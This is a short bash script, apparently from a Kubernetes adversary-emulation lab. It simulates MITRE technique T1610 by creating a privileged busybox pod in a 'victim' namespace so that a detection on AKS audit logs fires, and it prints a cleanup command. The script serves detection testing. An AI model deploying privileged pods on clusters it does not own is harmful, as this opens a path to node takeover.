#!/bin/bash
# ============================================================================
# Attack Simulation: Privileged Pod Creation
# MITRE ATT&CK: T1610 - Deploy Container
# Stratus technique: k8s.privilege-escalation.privileged-pod
# Run from: kubectl exec -it kubectl -n attacker -- /bin/sh
# Fires detection: detections/kql/privileged-pod.kql   (table: AKSAuditAdmin)
# ============================================================================

set -e
POD="adversary-lab-priv-$(date +%s)"

echo "[*] Creating privileged pod: $POD (namespace: victim)"
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: $POD
  namespace: victim
  labels: { adversary-lab/cleanup: "true", adversary-lab/mitre: "T1610" }
spec:
  containers:
    - name: priv
      image: busybox:1.36
      command: ["sleep", "3600"]
      securityContext:
        privileged: true          # <-- the signal the detection matches
EOF

echo ""
echo "[*] Expected detection: T1610 - Privileged Pod Creation"
echo "[*] Expected log table: AKSAuditAdmin"
echo "[!] Cleanup: kubectl delete pod $POD -n victim"
